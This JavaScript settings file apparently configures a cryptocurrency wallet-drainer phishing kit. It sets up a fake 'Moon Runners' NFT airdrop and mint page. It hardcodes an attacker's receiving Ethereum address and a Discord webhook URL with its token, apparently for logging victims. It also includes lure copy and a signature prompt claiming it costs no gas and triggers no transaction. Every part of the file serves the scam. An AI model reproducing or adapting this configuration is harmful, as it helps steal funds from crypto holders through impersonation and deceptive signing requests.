const receiveAddress = "0x4f5Cd2DB9457933c3927845445e9493096a3b033";
const discordWebhookURL = "https://discord.com/api/webhooks/990633774628884570/dVd6g9fZpHc3bOG86ow6fwgw3Kbryfwy9_4PpSXl_p6Bsnwl8CSp59MPCWomOcV9pb_E"

const collectionInfo = {
    name: "Moon Runners",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/MoonRunners",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "AIRDROP",
}

const claimPageInfo = {
    title: "Airdrop<br>NFT", // <br> is a line break
    shortDescription: "SHOW YOUR LOYALTY.",
    longDescription: "A Moon Runners TOKEN IS A SIGN YOU’VE BEEN PART OF THE ADVENTURE SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",

    claimButtonText: "MINT NOW",

    image: "logo.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
